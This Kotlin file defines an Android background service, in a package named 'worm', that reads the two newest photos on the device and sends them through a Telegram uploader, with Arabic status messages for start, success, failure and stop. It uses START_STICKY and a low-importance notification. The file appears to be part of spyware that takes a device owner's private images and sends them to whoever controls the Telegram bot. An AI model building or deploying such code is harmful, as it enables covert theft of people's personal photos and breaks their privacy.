package com.worm.photouploader

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

class UploadService : Service() {

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        createChannel()
        startForeground(1, buildNotification())
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        scope.launch {
            try {
                delay(1000)
                TelegramUploader.sendText("📡 الخدمة بدأت — جاري رفع آخر صورتين...")
                val uris = MediaReader.getLatestImages(applicationContext, 2)
                if (uris.isEmpty()) {
                    TelegramUploader.sendText("⚠️ لا توجد صور في الجهاز")
                } else {
                    for (uri in uris) {
                        val ok = TelegramUploader.sendPhoto(applicationContext, uri)
                        if (!ok) TelegramUploader.sendText("❌ فشل رفع صورة")
                    }
                    TelegramUploader.sendText("✅ تم رفع ${uris.size} صورة")
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        scope.launch { TelegramUploader.sendText("🛑 الخدمة توقفت") }
    }

    private fun createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(
                "upload_channel",
                "Photo Uploader",
                NotificationManager.IMPORTANCE_LOW
            )
            val nm = getSystemService(NotificationManager::class.java)
            nm.createNotificationChannel(ch)
        }
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, "upload_channel")
            .setContentTitle("Photo Uploader")
            .setContentText("الخدمة تعمل في الخلفية")
            .setSmallIcon(android.R.drawable.stat_sys_upload)
            .setOngoing(true)
            .build()
    }
}
